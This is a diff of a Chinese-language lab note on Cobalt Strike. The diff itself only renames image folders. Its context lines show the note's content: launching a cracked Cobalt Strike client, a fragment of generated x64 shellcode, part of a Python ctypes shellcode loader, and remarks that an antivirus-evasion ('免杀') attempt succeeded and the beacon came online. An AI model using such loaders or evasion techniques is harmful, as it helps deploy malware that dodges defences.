@@ -21,7 +21,7 @@ date: 2024-07-16 14:33:49
 java -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar
 ```
 
-![image-20240716144812645](../img/zuolao/11/image-20240716144812645.png)
+![image-20240716144812645](../images/zuolao/11/image-20240716144812645.png)
 
 查看生成的 payload
 
@@ -35,9 +35,9 @@ buf = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\
 
 直接运行，cs 直接上线
 
-![image-20240716145123361](../img/zuolao/11/image-20240716145123361.png)
+![image-20240716145123361](../images/zuolao/11/image-20240716145123361.png)
 
-![image-20240716145157292](../img/zuolao/11/image-20240716145157292.png)
+![image-20240716145157292](../images/zuolao/11/image-20240716145157292.png)
 
 ## shellcode 免杀
 
@@ -102,14 +102,14 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1
 
 看了一眼兵哥的实验报告
 
-![image-20240716154238149](../img/zuolao/11/image-20240716154238149.png)
+![image-20240716154238149](../images/zuolao/11/image-20240716154238149.png)
 
 免杀成功
 
-![image-20240716154328958](../img/zuolao/11/image-20240716154328958.png)
+![image-20240716154328958](../images/zuolao/11/image-20240716154328958.png)
 
-![image-20240716154317052](../img/zuolao/11/image-20240716154317052.png)
+![image-20240716154317052](../images/zuolao/11/image-20240716154317052.png)
 
-![image-20240716154504032](../img/zuolao/11/image-20240716154504032.png)
+![image-20240716154504032](../images/zuolao/11/image-20240716154504032.png)
 
 上线
